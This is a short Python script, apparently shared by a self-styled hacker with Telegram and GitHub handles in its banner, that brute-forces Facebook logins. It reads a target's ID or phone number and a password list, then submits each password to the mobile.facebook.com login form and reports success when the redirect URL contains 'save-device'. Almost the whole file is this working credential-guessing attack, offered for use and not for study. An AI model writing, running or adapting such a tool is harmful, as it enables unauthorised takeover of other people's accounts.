#!/usr/bin/python
import os, sys, mechanicalsoup
y = '\033[1;33m'
b = '\033[1;34m'
r = '\033[1;31m'
g = '\033[1;37m'

os.system("clear")
print(r)
print("""
            ______________________________________________________
           |    _____________________________________________     |
           |   |                                             |    |
           |   |              BY:M0HAM3D_HaCker              |    |
           |   |          tele: @HcmohtatefOfficial          |    |
           |   |              tele: @HAKER33                 |    |
           |   |               git: M0HAM3D                  |    |
           |   |                  Fb HAK                     |    |
           |   |_____________________________________________|    |
           |______________________________________________________|\n\n""")


print(b)
email = input('Enter ID OR Number :> ')
word = input('EnTer Passlist :> ')
lista = open(word, 'r')
r = lista.readlines()
br = mechanicalsoup.StatefulBrowser()
for pa in r:
    br.open('https://mobile.facebook.com')
    br.select_form('#login_form')
    br['email'] = email
    br['pass'] = pa
    br.submit_selected(btnName='login')
    print ('[*] NoT Found ===>' + pa)
    cls = br.get_url()
    if 'save-device' in cls:
	#print (y)
        print ('[+]PassWoRD is ===>' +pa )

